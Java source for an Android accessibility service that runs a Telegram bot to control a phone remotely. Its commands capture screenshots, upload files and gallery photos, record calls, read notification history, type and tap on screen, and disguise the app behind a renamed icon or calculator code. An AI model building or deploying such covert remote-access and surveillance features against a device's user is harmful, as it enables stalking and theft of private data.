package com.pulse.control;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/** The bot engine: accessibility service + Telegram long-polling loop. */
public class BotService extends AccessibilityService {
    static volatile boolean alive = false;
    public static boolean isAlive() { return alive; }


    public static final String TAG = "PulseControl";

    // ------------------------------------------------------------------ statics

    private static volatile BotService instance;
    private static volatile boolean engineUp = false;
    public static volatile int lastPing = -1;
    public static volatile int cmdCount = 0;
    public static volatile String lastForegroundPkg = null;

    private static final AtomicBoolean STOP = new AtomicBoolean(false);
    private static Thread worker;
    private static Thread alertsThread;
    private static TgApi api;
    private static Config cfg;
    private static String botUsername = Config.DEFAULT_USERNAME;
    private static volatile long lastShotMsg = 0L;

    private static List<Apps.Item> appsSession = new ArrayList<>();
    private static int appsPage = 0;

    private static final Map<Long, Long> AUTHED = new HashMap<>();

    private final ExecutorService actions = Executors.newSingleThreadExecutor();
    private final Handler ui = new Handler(Looper.getMainLooper());

    // ================================================================== lifecycle

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        alive = true;
        instance = this;
        Act.init(this);
        requestScreenshotFlag();
        LogStore.add("✅ Служба доступа подключена");
        startEngine();
        startAlerts();
        Background.start(this);
        try { PhoneWatcher.start(this); } catch (Exception ignored) {}
        try { WebServer.start(this); } catch (Exception ignored) {}
        try {
            if (Relay.enabled(this)) RelayService.start(this);
        } catch (Exception ignored) {}
        MainActivity.pokeUi();
    }

    private void requestScreenshotFlag() {
        if (android.os.Build.VERSION.SDK_INT >= 30) {
            try {
                AccessibilityServiceInfo info = getServiceInfo();
                if (info != null) {
                    info.flags |= (1 << 20); // FLAG_REQUEST_TAKE_SCREENSHOT
                    setServiceInfo(info);
                }
            } catch (Throwable ignored) {}
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Минимум работы в главном потоке: только запоминаем имя пакета.
        try {
            if (event == null) return;
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence p = event.getPackageName();
                if (p != null) lastForegroundPkg = p.toString();
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onDestroy() {
        alive = false;
        LogStore.add("⛔ Служба доступа отключена");
        stopEngine();
        instance = null;
        MainActivity.pokeUi();
        super.onDestroy();
    }

    // ================================================================== engine

    private static final Object LOCK = new Object();

    private void startEngine() {
        synchronized (LOCK) {
            if (worker != null && worker.isAlive()) return;
            cfg = Config.get(this);
            if (!cfg.tokenOk()) {
                LogStore.add("⚠️ Токен не задан — откройте приложение и сохраните настройки");
                engineUp = false;
                return;
            }
            api = new TgApi(cfg.token);
            STOP.set(false);
            engineUp = true;
            worker = new Thread(this::loop, "pulse-bot");
            worker.setDaemon(true);
            worker.start();
            LogStore.add("🚀 Движок бота запущен");
        }
    }

    private void stopEngine() {
        synchronized (LOCK) {
            STOP.set(true);
            engineUp = false;
            if (worker != null) worker.interrupt();
            worker = null;
        }
    }

    public static void reload(Context c) {
        BotService b = instance;
        if (b != null) {
            LogStore.add("🔄 Перезапуск движка…");
            b.stopEngine();
            b.startEngine();
            MainActivity.pokeUi();
        }
    }

    public static boolean isUp() { return engineUp; }
    public static boolean isServiceOn() { return instance != null; }
    public static String username() { return botUsername; }
    public static BotService inst() { return instance; }

    // ================================================================== alerts thread

    private void startAlerts() {
        if (alertsThread != null && alertsThread.isAlive()) return;
        alertsThread = new Thread(() -> {
            boolean wasCharging = Sys.charging(this);
            boolean wasOnline = Sys.online(this);
            boolean lowNotified = false;
            long lastTemp = 0;
            while (!STOP.get()) {
                try {
                    Thread.sleep(45000);
                    int pct = Sys.batteryPercent(this);
                    Config.pushBattery(this, Math.max(0, pct));
                    if (Config.alertsOn(this)) {
                        boolean charging = Sys.charging(this);
                        boolean online = Sys.online(this);
                        if (Config.alertFlag(this, "al_low") && pct <= 15 && !charging && !lowNotified) {
                            lowNotified = true;
                            Act.sendToAdmin("🪫 <b>Батарея " + pct + "%</b>\n<i>Подключите зарядку.</i>", null);
                        }
                        if (pct > 25) lowNotified = false;
                        if (Config.alertFlag(this, "al_chg") && charging && !wasCharging) {
                            Act.sendToAdmin("⚡ <b>Телефон на зарядке</b> · " + pct + "%", null);
                        }
                        if (Config.alertFlag(this, "al_net") && wasOnline && !online) {
                            Act.sendToAdmin("📡 <b>Пропала сеть</b> на телефоне", null);
                        }
                        float t = Sys.batteryTemp(this);
                        if (Config.alertFlag(this, "al_temp") && t >= 42f
                                && System.currentTimeMillis() - lastTemp > 30 * 60 * 1000L) {
                            lastTemp = System.currentTimeMillis();
                            Act.sendToAdmin("🌡 <b>Перегрев</b>: " + String.format(Locale.getDefault(), "%.1f", t) + "°C", null);
                        }
                        wasCharging = charging;
                        wasOnline = online;
                    }
                    // scheduled commands
                    Sched.tick(this, this::runScheduled);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception ignored) {}
            }
        }, "pulse-alerts");
        alertsThread.setDaemon(true);
        alertsThread.start();
    }

    private void runScheduled(String cmd, String arg) {
        switch (cmd) {
            case "lock": global(GLOBAL_ACTION_LOCK_SCREEN); break;
            case "home": global(GLOBAL_ACTION_HOME); break;
            case "mute": Sys.mute(this, true); break;
            case "unmute": Sys.mute(this, false); break;
            case "find": sirens(this, 3); break;
            case "tts": Tools.say(this, arg, null); break;
            default: break;
        }
        Act.sendToAdmin("⏰ Выполнено по расписанию: <b>" + Sched.label(cmd, arg) + "</b>", null);
    }

    // ================================================================== bot loop

    private void loop() {
        try {
            Http.Resp me = api.getMe();
            if (!me.ok()) {
                LogStore.add("❌ getMe: " + me.description());
                engineUp = false;
                return;
            }
            JSONObject r = new JSONObject(me.body).getJSONObject("result");
            botUsername = r.optString("username", botUsername);
            Config.setBotUsername(this, botUsername);
            LogStore.add("🤖 Подключено к @" + botUsername);
            try {
                String url = "http://" + WebServer.lanIp() + ":" + WebServer.port() + "/";
                Http.Resp mb = api.setMenuButton(url, "Пульт");
                if (mb.ok()) LogStore.add("🎛 Кнопка «Пульт» установлена");
            } catch (Exception ignored) {}
        } catch (Exception e) {
            LogStore.add("❌ Подключение: " + e.getMessage());
            engineUp = false;
            return;
        }

        long offset = Config.getOffset(this);
        int errors = 0;
        while (!STOP.get()) {
            try {
                long t0 = SystemClock.elapsedRealtime();
                Http.Resp resp = api.getUpdates(offset, 40);
                if (resp.code == 200 && resp.ok()) {
                    lastPing = (int) (SystemClock.elapsedRealtime() - t0);
                    errors = 0;
                    JSONArray arr = new JSONObject(resp.body).optJSONArray("result");
                    if (arr != null) {
                        for (int i = 0; i < arr.length() && !STOP.get(); i++) {
                            JSONObject upd = arr.optJSONObject(i);
                            if (upd == null) continue;
                            offset = Math.max(offset, upd.optLong("update_id") + 1);
                            Config.setOffset(this, offset);
                            try { handle(upd); }
                            catch (Exception e) { LogStore.add("⚠️ " + e.getClass().getSimpleName() + ": " + e.getMessage()); }
                        }
                    }
                } else {
                    errors++;
                    lastPing = -1;
                    if (errors == 1 || errors % 20 == 0) LogStore.add("📡 Сеть: " + resp.description());
                    sleep(errors > 3 ? 15000 : 5000);
                }
            } catch (Exception e) {
                if (STOP.get()) break;
                errors++;
                sleep(10000);
                if (errors % 5 == 1) LogStore.add("📡 Ожидание сети…");
            }
        }
        engineUp = false;
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    // ================================================================== routing

    private void handle(JSONObject upd) throws Exception {
        if (upd.has("callback_query")) onCallback(upd.getJSONObject("callback_query"));
        else if (upd.has("message")) onMessage(upd.getJSONObject("message"));
    }

    private long senderId(JSONObject o) {
        JSONObject from = o.optJSONObject("from");
        return from == null ? 0 : from.optLong("id");
    }

    private boolean isAdmin(long id) { return Config.admins(this).contains(id); }

    private boolean pinOk(long chat) {
        String pin = Config.get(this).pin;
        if (pin == null || pin.length() < 4) return true;
        Long until = AUTHED.get(chat);
        return until != null && until > System.currentTimeMillis();
    }

    private void onMessage(JSONObject msg) {
        try {
            JSONObject chatObj = msg.optJSONObject("chat");
            long chat = chatObj == null ? 0 : chatObj.optLong("id");
            long from = senderId(msg);
            if (chat == 0) return;

            String text = msg.optString("text", "");
            String trimmed = text.trim();

            if (!isAdmin(from)) {
                api.sendMessage(chat, "⛔ <b>Доступ закрыт</b>\n\nЭтот пульт слушает только владельца.\n"
                        + "Твой ID: <code>" + from + "</code>", null);
                LogStore.add("⛔ Посторонний: " + from);
                return;
            }

            // PIN gate
            if (!pinOk(chat)) {
                if (trimmed.equals(Config.get(this).pin)) {
                    AUTHED.put(chat, System.currentTimeMillis() + 30 * 60 * 1000L);
                    api.sendMessage(chat, "🔓 <b>PIN принят</b>\nВход на 30 минут.", Kb.main());
                } else {
                    api.sendMessage(chat, "🔐 <b>Бот под PIN-кодом</b>\n\n"
                            + "Отправьте цифровой PIN, чтобы продолжить.", null);
                }
                return;
            }

            // pending input modes
            if (Act.modeFresh() && Act.modeChat() == chat && !trimmed.startsWith("/")) {
                String mode = Act.mode();
                Act.clearMode();
                receiveInput(chat, mode, trimmed);
                return;
            }
            Act.clearMode();

            if (trimmed.startsWith("/")) {
                String cmd = trimmed.split("\\s+")[0].toLowerCase(Locale.ROOT);
                int at = cmd.indexOf('@');
                if (at > 0) cmd = cmd.substring(0, at);
                String rest = trimmed.length() > cmd.length() ? trimmed.substring(cmd.length()).trim() : "";
                LogStore.add("⌘ " + cmd);
                switch (cmd) {
                    case "/start":
                    case "/menu":
                    case "/help": cmdCount++; api.sendMessage(chat, textMain(), Kb.main()); return;
                    case "/screen": cmdCount++; captureAndSend(chat); return;
                    case "/home": cmdCount++; doHome(chat); return;
                    case "/lock": cmdCount++; doLock(chat); return;
                    case "/status": cmdCount++; api.sendMessage(chat, textStat(), Kb.main()); return;
                    case "/id": api.sendMessage(chat, "🆔 Ваш ID: <code>" + from + "</code>\n💬 Чат: <code>" + chat + "</code>", Kb.main()); return;
                    case "/apps": cmdCount++; sendApps(chat); return;
                    case "/say":
                    case "/tts":
                        if (rest.isEmpty()) { Act.setMode("tts", null, chat); api.sendMessage(chat, "🗣 <b>Озвучка</b>\nПришлите текст — телефон его произнесёт вслух.", null); }
                        else { Tools.say(this, rest, null); api.sendMessage(chat, "🗣 Говорю: <i>" + esc(rest) + "</i>", Kb.main()); }
                        return;
                    case "/open":
                        if (rest.isEmpty()) { Act.setMode("app", null, chat); api.sendMessage(chat, "🚀 Напишите название приложения.", null); }
                        else launchByName(chat, rest);
                        return;
                    case "/type":
                        if (rest.isEmpty()) { Act.setMode("text", null, chat); api.sendMessage(chat, "⌨️ Пришлите текст для ввода.", null); }
                        else typeInField(chat, null, rest);
                        return;
                    case "/logout": AUTHED.remove(chat); api.sendMessage(chat, "🔒 Выход из бота. Пришлите PIN снова.", null); return;
                    case "/wall": {
                        if (msg.has("photo") || msg.has("document")) { receiveFile(chat, msg); return; }
                        Act.setMode("wall", null, chat);
                        api.sendMessage(chat, "🖼 Пришлите картинку — поставлю на обои.", null);
                        return;
                    }
                    case "/pin": {
                        if (rest.isEmpty()) { Act.setMode("pin", null, chat); api.sendMessage(chat, "🔐 Пришлите 4–8 цифр.", null); }
                        else setPin(chat, rest);
                        return;
                    }
                    case "/calc": {
                        String code = rest.replaceAll("[^0-9]", "");
                        if (code.length() >= 3) {
                            Config.setCalcCode(this, code);
                            api.sendMessage(chat, "🎭 Код калькулятора: <code>" + code + "</code>", Kb.catSet());
                        } else api.sendMessage(chat, "🎭 Формат: /calc 7777", Kb.catSet());
                        return;
                    }
                    case "/macro": {
                        if (rest.isEmpty()) { api.sendMessage(chat, textMacro(), Kb.macroPanel(Config.macros(this))); return; }
                        addMacro(chat, rest);
                        return;
                    }
                    case "/trig": {
                        if (rest.equals("-")) { Config.triggersSet(this, new JSONArray()); api.sendMessage(chat, "📶 Правила очищены", Kb.catAuto()); return; }
                        if (rest.isEmpty()) { api.sendMessage(chat, "📶 <b>Триггеры</b>\n\n" + trigDump(this), Kb.catAuto()); return; }
                        addTrigger(chat, rest);
                        return;
                    }
                    case "/digest": api.sendMessage(chat, Background.buildDigest(this), Kb.catAuto()); return;
                    case "/sys": api.sendMessage(chat, Hardware.cpuReport() + "\n" + Hardware.memReport(this) + "\n" + Hardware.netReport(this), Kb.catInfo()); return;
                    case "/speed": {
                        api.sendMessage(chat, "🚀 Тестирую скорость…", null);
                        new Thread(() -> api.sendMessage(chat, Hardware.speedTest(this), Kb.catInfo()), "pulse-speed").start();
                        return;
                    }
                    case "/ls": {
                        java.io.File dir = Fs.resolve(rest);
                        if (!dir.isDirectory()) { api.sendMessage(chat, "📁 Не папка: " + esc(rest), Kb.catMedia()); return; }
                        StringBuilder sb = new StringBuilder("📁 <code>" + esc(Fs.rel(dir)) + "</code>\n\n");
                        int n = 0;
                        for (Fs.Entry e : Fs.list(dir)) {
                            if (n++ >= 40) break;
                            sb.append(e.dir ? "📂 " : "📄 ").append(esc(e.name));
                            if (!e.dir) sb.append(" <i>").append(Fs.human(e.size)).append("</i>");
                            sb.append("\n");
                        }
                        sb.append("\n/get <code>").append(esc(Fs.rel(dir))).append("/имя</code> — скачать файл");
                        api.sendMessage(chat, sb.toString(), Kb.catMedia());
                        return;
                    }
                    case "/get": {
                        if (rest.isEmpty()) { api.sendMessage(chat, "📤 Формат: /get sdcard/Download/file.pdf", Kb.catMedia()); return; }
                        api.sendMessage(chat, "📤 Читаю файл…", null);
                        new Thread(() -> {
                            byte[] data = Fs.read(rest, 40 * 1024 * 1024);
                            if (data == null) { api.sendMessage(chat, "📤 Не смог прочитать (нет доступа или >40 МБ)", Kb.catMedia()); return; }
                            String name = rest.substring(rest.lastIndexOf('/') + 1);
                            Http.Resp r = api.sendDocument(chat, data, name, "📤 <b>" + esc(name) + "</b> · " + Fs.human(data.length), Kb.catMedia());
                            if (!r.ok()) api.sendMessage(chat, "📤 Не ушло: " + r.description(), null);
                        }, "pulse-get").start();
                        return;
                    }
                    case "/call": {
                        if (rest.isEmpty()) { Act.setMode("call", null, chat); api.sendMessage(chat, "📞 Пришлите номер.", null); return; }
                        boolean ok = Dial.call(this, rest);
                        api.sendMessage(chat, ok ? "📞 Звоню: " + esc(rest) : "📞 Нет разрешения на звонки", Kb.catAct());
                        return;
                    }
                    case "/sched": {
                        if (rest.isEmpty()) { api.sendMessage(chat, textSched(), Kb.schedule()); return; }
                        Act.setMode("sched", null, chat);
                        receiveInput(chat, "sched", rest);
                        return;
                    }
                    case "/nhistory": {
                        java.util.List<String> h = Config.notifHistory(this);
                        StringBuilder sb = new StringBuilder("📜 История (последние 25):\n\n");
                        for (int i = 0; i < Math.min(h.size(), 25); i++) sb.append("• ").append(esc(h.get(i))).append("\n");
                        if (h.isEmpty()) sb.append("<i>пусто</i>");
                        api.sendMessage(chat, sb.toString(), Kb.catInfo());
                        return;
                    }
                    case "/ignore": {
                        if (rest.isEmpty()) { api.sendMessage(chat, "🚫 /ignore com.package.name", Kb.catSet()); return; }
                        Config.notifIgnoreAdd(this, rest.trim());
                        api.sendMessage(chat, "🚫 Добавлено в игнор: <code>" + esc(rest.trim()) + "</code>", Kb.catSet());
                        return;
                    }
                    case "/unignore": {
                        Config.notifIgnoreClear(this);
                        api.sendMessage(chat, "🧹 Игнор-лист очищен", Kb.catSet());
                        return;
                    }
                    case "/log": api.sendMessage(chat, "📜 <b>Журнал</b>\n\n<code>" + esc(tail(LogStore.dump(), 2500)) + "</code>", Kb.catSet()); return;
                    case "/eco": {
                        boolean on = !Eco.on(this);
                        Eco.set(this, on);
                        api.sendMessage(chat, Eco.report(this), Kb.catSet());
                        return;
                    }
                    case "/allfunc":
                    case "/func": {
                        api.sendMessage(chat, cmdCatalog(), Kb.main());
                        return;
                    }
                    case "/_": {
                        // универсальный вызов любой функции: /_ torch  /_ setvol:70
                        String raw = text.replaceFirst("(?i)^/_\\s*", "").trim();
                        if (raw.isEmpty()) {
                            api.sendMessage(chat, cmdCatalog(), Kb.main());
                            return;
                        }
                        String err = WebServer.runCommand(this, raw);
                        api.sendMessage(chat, err == null
                                ? "✅ <code>" + esc(raw) + "</code>\n\n" + Sys.footer(this)
                                : "⚠️ <b>" + esc(raw) + "</b>\n" + esc(err), Kb.main());
                        return;
                    }
                    case "/alert": {
                        String body = text.replaceFirst("(?i)^/alert\\s*", "").trim();
                        if (body.isEmpty()) {
                            Act.setMode("alert", "", chat);
                            api.sendMessage(chat, "💬 <b>Алерт на экран</b>\n\n"
                                    + "Пришли текст — он высветится поверх всего экрана.\n"
                                    + "Можно добавить стиль: <code>текст | danger | 30</code>\n"
                                    + "<i>(текст | стиль | секунды, 0 = до нажатия)</i>", Kb.catCtl());
                            return;
                        }
                        String[] pp = body.split("\\|");
                        String txt = pp[0].trim();
                        String style = pp.length > 1 ? pp[1].trim() : "success";
                        int secs = pp.length > 2 ? intOf(pp[2].trim()) : 0;
                        final String[] err = new String[1];
                        AlertOverlay.show(this, txt, "PULSE CONTROL", style, secs, true, false, e -> err[0] = e);
                        api.sendMessage(chat, err[0] == null
                                ? "💬 <b>Показано на экране</b>\n\n" + esc(txt)
                                : "⚠️ " + esc(err[0]), Kb.catCtl());
                        return;
                    }
                    case "/device": {
                        api.sendMessage(chat, Device.setupTips(this), Kb.catSet());
                        return;
                    }
                    case "/model": {
                        api.sendMessage(chat, "📱 <b>" + esc(Device.model()) + "</b>\n"
                                + esc(Device.android()) + "\n" + esc(Device.brandName()), Kb.main());
                        return;
                    }
                    case "/callrec": {
                        String a = text.replaceFirst("(?i)^/callrec\\s*", "").trim().toLowerCase(java.util.Locale.ROOT);
                        if (a.equals("all")) CallRec.setMode(this, CallRec.ALL);
                        else if (a.equals("off")) CallRec.setMode(this, CallRec.OFF);
                        else if (a.equals("on") || a.equals("contacts")) CallRec.setMode(this, CallRec.CONTACTS);
                        api.sendMessage(chat, CallRec.report(this), Kb.callRecKb(this));
                        return;
                    }
                    case "/record":
                    case "/rec_call": {
                        String err = CallRec.start(this, "manual");
                        api.sendMessage(chat, err == null
                                ? "🔴 <b>Запись начата</b>\n\n/stop_rec_call — остановить"
                                : "⚠️ " + esc(err), Kb.callRecKb(this));
                        return;
                    }
                    case "/stop_rec_call": {
                        if (!CallRec.isRecording()) { api.sendMessage(chat, "⚪ Запись не идёт", Kb.callRecKb(this)); return; }
                        CallRec.stopAndSend(this);
                        return;
                    }
                    case "/calls": {
                        String a = text.replaceFirst("(?i)^/calls\\s*", "").trim();
                        CallRec.sendLast(this, a.isEmpty() ? 5 : Math.max(1, Math.min(20, intOf(a))));
                        return;
                    }
                    case "/gallery": {
                        String b = text.replaceFirst("(?i)^/gallery\\s*", "").trim();
                        int n = b.isEmpty() ? 5 : Math.max(1, Math.min(20, intOf(b)));
                        api.sendMessage(chat, "🖼 Беру последние " + n + " фото…", null);
                        Gallery.sendLatest(this, n);
                        return;
                    }
                    case "/relay": {
                        api.sendMessage(chat, Net.channelsReport(this), relayKb());
                        return;
                    }
                    case "/panel_check": {
                        api.sendMessage(chat, "🔎 Проверяю, что видит панель…", null);
                        new Thread(() -> api.sendMessage(chat,
                                Relay.panelReport(this) + "\n\n" + Relay.selfTest(this),
                                relayKb()), "pulse-panelcheck").start();
                        return;
                    }
                    case "/relay_test": {
                        api.sendMessage(chat, "🔬 Запускаю самопроверку: отправляю тестовую команду сам себе через ntfy и жду, выполнится ли. Займёт до 10 секунд…", null);
                        new Thread(() -> api.sendMessage(chat, Relay.selfTest(this), relayKb()), "pulse-selftest").start();
                        return;
                    }
                    case "/relay_svc": {
                        api.sendMessage(chat, Relay.diag(this), relayKb());
                        return;
                    }
                    case "/relay_restart": {
                        api.sendMessage(chat, "📡 Перезапускаю службу релея…", null);
                        RelayService.stop(this);
                        new Thread(() -> {
                            try { Thread.sleep(1500); } catch (Exception ignored) {}
                            RelayService.start(BotService.this);
                            try { Thread.sleep(2500); } catch (Exception ignored) {}
                            api.sendMessage(chat, Relay.diag(BotService.this), relayKb());
                        }, "pulse-relay-restart").start();
                        return;
                    }
                    case "/key": {
                        api.sendMessage(chat, "🔑 <b>Ключ доступа к WebApp</b>\n\n<code>"
                                + WebServer.accessKey(this) + "</code>\n\n"
                                + "<i>Нужен, если открываешь панель в браузере с компьютера или из локальной сети. "
                                + "Без ключа доступ только с самого телефона (127.0.0.1).</i>\n\n"
                                + "<i>Если ключ попал к чужому — /newkey.</i>", Kb.catSet());
                        return;
                    }
                    case "/newkey": {
                        WebServer.regenerateKey(this);
                        api.sendMessage(chat, "🔑 Новый ключ:\n\n<code>" + WebServer.accessKey(this)
                                + "</code>\n\n<i>Старые сессии сброшены.</i>", Kb.catSet());
                        return;
                    }
                    case "/channel": {
                        api.sendMessage(chat, "📡 <b>Канал релея</b>\n\n<code>" + Relay.channel(this) + "</code>\n\n"
                                + "<i>Введи его в удалённой панели — тогда управление работает из любой сети.</i>",
                                relayKb());
                        return;
                    }
                    case "/diag": {
                        api.sendMessage(chat, "🔍 Проверяю связь…", null);
                        new Thread(() -> api.sendMessage(chat,
                                Relay.checkTelegram(this) + "\n\n" + Relay.diag(this),
                                Kb.catSet()), "pulse-diag").start();
                        return;
                    }
                    case "/rescue": {
                        api.sendMessage(chat, Net.rescueGuide(this), Kb.catSet());
                        return;
                    }
                    case "/icon": {
                        sendIconPanel(chat);
                        return;
                    }
                    case "/webapp":
                    case "/panel": {
                        String url = "http://" + WebServer.lanIp() + ":" + WebServer.port() + "/";
                        api.sendWebApp(chat,
                                "🎛 <b>WebApp-панель</b>\n\n"
                                        + "Красивый пульт в браузере — прямо с телефона.\n\n"
                                        + "📍 <b>Адреса:</b>\n"
                                        + "• этот телефон: <code>http://127.0.0.1:" + WebServer.port() + "/</code>"
                                + "  <i>(без ключа)</i>\n"
                                        + "• другие устройства в Wi-Fi: <code>" + url + "</code>\n\n"
                                        + "• с другого устройства в Wi-Fi: нужен ключ <code>"
                                        + WebServer.accessKey(this) + "</code>\n\n"
                                        + Sys.footer(this),
                                url, "🎛 Открыть WebApp");
                        return;
                    }
                    case "/stats": api.sendMessage(chat, "📈 <b>Статистика</b>\n\n" + Config.statsDump(this), Kb.catSet()); return;
                    default:
                        api.sendMessage(chat, "🤷 Неизвестная команда <code>" + esc(cmd) + "</code>\n\nОткройте /menu", Kb.main());
                        return;
                }
            }

            // photo / document reсeived (wallpaper, upload, tts via voice later)
            if (msg.has("photo") || msg.has("document")) {
                receiveFile(chat, msg);
                return;
            }

            // natural phrases
            String low = trimmed.toLowerCase(Locale.ROOT);
            if (low.contains("найди телефон") || low.contains("найти телефон") || low.equals("сирена")) {
                cmdCount++; sirens(this, 3);
                api.sendMessage(chat, "🆘 <b>Сирена включена на 3 сек</b>", Kb.find());
                return;
            }
            if ("callrec_add".equals(Act.mode())) {
                Act.clearMode();
                String who = text.trim();
                String num = who, cname = who;
                int bar = who.indexOf('|');
                if (bar > 0) { cname = who.substring(0, bar).trim(); num = who.substring(bar + 1).trim(); }
                if (num.replaceAll("[^0-9]", "").isEmpty()) {
                    api.sendMessage(chat, "⚠️ Нужен номер. Пример: <code>Мама|+79991234567</code>", null);
                    return;
                }
                CallRec.addContact(this, cname, num);
                api.sendMessage(chat, CallRec.report(this), Kb.callRecKb(this));
                return;
            }
            if ("alert".equals(Act.mode())) {
                Act.clearMode();
                String[] pp = text.split("\\|");
                String txt = pp[0].trim();
                String style = pp.length > 1 ? pp[1].trim() : "success";
                int secs = pp.length > 2 ? intOf(pp[2].trim()) : 0;
                final String[] err = new String[1];
                AlertOverlay.show(this, txt, "PULSE CONTROL", style, secs, true, false, e -> err[0] = e);
                api.sendMessage(chat, err[0] == null ? "💬 Показано на экране" : "⚠️ " + esc(err[0]), Kb.catCtl());
                return;
            }
            if ("rename".equals(Act.mode())) {
                Act.clearMode();
                String nm = text.trim();
                Stealth.setLabel(this, nm.equalsIgnoreCase("сброс") ? "" : nm);
                api.sendMessage(chat, "📛 Название обновлено: <b>"
                        + esc(Stealth.label(this).isEmpty() ? "исходное" : Stealth.label(this))
                        + "</b>\n\n<i>Иконка обновится после перезапуска лаунчера.</i>", Kb.catSet());
                return;
            }
            if (low.startsWith("открой ")) { cmdCount++; launchByName(chat, trimmed.substring(7)); return; }
            if (low.startsWith("скажи ")) { cmdCount++; Tools.say(this, trimmed.substring(6), null);
                api.sendMessage(chat, "🗣 Говорю: <i>" + esc(trimmed.substring(6)) + "</i>", Kb.main()); return; }
            if (low.startsWith("введи ")) { cmdCount++; typeInField(chat, null, trimmed.substring(6)); return; }
            if (low.equals("домой") || low.equals("рабочий стол")) { cmdCount++; doHome(chat); return; }
            if (low.equals("блокировка") || low.equals("заблокируй")) { cmdCount++; doLock(chat); return; }
            if (low.equals("скрин") || low.equals("скриншот")) { cmdCount++; captureAndSend(chat); return; }
            if (low.equals("тише")) { cmdCount++; int p = Sys.adjustMusic(this, -1);
                api.sendMessage(chat, "🔉 Громкость: <b>" + p + "%</b>", Kb.volume()); return; }
            if (low.equals("громче")) { cmdCount++; int p = Sys.adjustMusic(this, 1);
                api.sendMessage(chat, "🔊 Громкость: <b>" + p + "%</b>", Kb.volume()); return; }
            if (low.equals("фонарик")) { cmdCount++; boolean on = Tools.torch(this, !Tools.torchState());
                api.sendMessage(chat, on ? "🔦 Фонарик <b>включён</b>" : "🌑 Фонарик <b>выключен</b>", Kb.torch()); return; }

            api.sendMessage(chat, textMain(), Kb.main());
        } catch (Exception e) {
            LogStore.add("⚠️ " + e.getMessage());
        }
    }

    // ------------------------------------------------------------ input receive

    private void receiveInput(long chat, String mode, String text) {
        switch (mode) {
            case "text": {
                typeInField(chat, null, text);
                break;
            }
            case "textfield": {
                typeInField(chat, Act.arg(), text);
                break;
            }
            case "tts": {
                Tools.say(this, text, null);
                api.sendMessage(chat, "🗣 Говорю: <i>" + esc(text) + "</i>", Kb.main());
                break;
            }
            case "url": {
                openUrl(chat, text);
                break;
            }
            case "app": {
                launchByName(chat, text);
                break;
            }
            case "sched": {
                addSchedule(chat, text);
                break;
            }
            case "clip": { sendClipSet(chat, text); break; }
            case "taptext": {
                boolean ok = Gestures.tapByText(this, text, null);
                api.sendMessage(chat, ok ? "👆 Нажал на «" + esc(text) + "»" : "👆 Текст «" + esc(text) + "» не найден", Kb.catCtl());
                break;
            }
            case "wall": {
                api.sendMessage(chat, "🖼 Пришлите картинку файлом/фото — поставлю на рабочий стол.", null);
                break;
            }
            case "fromtg": {
                api.sendMessage(chat, "📥 Жду файл.", null);
                break;
            }
            case "macro": {
                addMacro(chat, text);
                break;
            }
            case "trig": {
                addTrigger(chat, text);
                break;
            }
            case "call": {
                boolean ok = Dial.call(this, text);
                api.sendMessage(chat, ok ? "📞 <b>Звоню:</b> " + esc(text) : "📞 Нужно разрешение на звонки", Kb.catAct());
                break;
            }
            case "sms": {
                String[] parts = text.split("\\s+", 2);
                boolean ok = Dial.sms(this, parts[0], parts.length > 1 ? parts[1] : "");
                api.sendMessage(chat, ok ? "💬 <b>SMS подготовлено</b> для " + esc(parts[0]) : "💬 Не удалось", Kb.catAct());
                break;
            }
            case "contact": {
                java.util.List<String[]> cs = Dial.contacts(this, text, 5);
                if (cs.isEmpty()) { api.sendMessage(chat, "📇 Никого не нашёл", Kb.catAct()); break; }
                StringBuilder sb = new StringBuilder("📇 <b>Нашёл:</b>\n\n");
                for (String[] cc : cs) sb.append("• ").append(esc(cc[0])).append(" — <code>").append(esc(cc[1])).append("</code>\n");
                sb.append("\nСкопируйте номер и отправьте как /call или кнопкой 📞");
                api.sendMessage(chat, sb.toString(), Kb.catAct());
                break;
            }
            case "alarm": {
                try {
                    String t2 = text.replaceAll("[^0-9:]", "");
                    String[] hm = t2.split(":");
                    int h = Integer.parseInt(hm[0]);
                    int m = hm.length > 1 ? Integer.parseInt(hm[1]) : 0;
                    Dial.alarm(this, h, m, "Pulse");
                    api.sendMessage(chat, "⏰ <b>Будильник " + h + ":" + (m < 10 ? "0" + m : m) + "</b>", Kb.catAct());
                } catch (Exception e) {
                    api.sendMessage(chat, "⏰ Не понял время. Пример: <code>7:30</code>", Kb.catAct());
                }
                break;
            }
            case "web": {
                String u = "https://www.google.com/search?q=" + android.net.Uri.encode(text);
                openUrl(chat, u);
                break;
            }
            case "adm": {
                addAdmin(chat, text);
                break;
            }
            case "admdel": {
                delAdmin(chat, text);
                break;
            }
            case "pin": {
                setPin(chat, text);
                break;
            }
            default:
                api.sendMessage(chat, "🤔 Не понял ввод. Откройте /menu", Kb.main());
        }
    }

    // ================================================================== callbacks

    private void onCallback(JSONObject cb) throws Exception {
        String id = cb.optString("id");
        JSONObject msg = cb.optJSONObject("message");
        long chatTmp = 0, midTmp = 0;
        boolean isTextTmp = false;
        if (msg != null) {
            JSONObject chatObj = msg.optJSONObject("chat");
            chatTmp = chatObj == null ? 0 : chatObj.optLong("id");
            midTmp = msg.optLong("message_id");
            isTextTmp = msg.has("text");
        }
        final long chat = chatTmp, mid = midTmp;
        final boolean isText = isTextTmp;
        long from = senderId(cb);
        if (!isAdmin(from) || chat == 0) { api.answer(id, "⛔ Только владелец"); return; }
        if (!pinOk(chat)) {
            api.answer(id, "🔐 Сначала PIN");
            api.sendMessage(chat, "🔐 Отправьте PIN-код сообщением.", null);
            return;
        }

        String data = cb.optString("data", "");
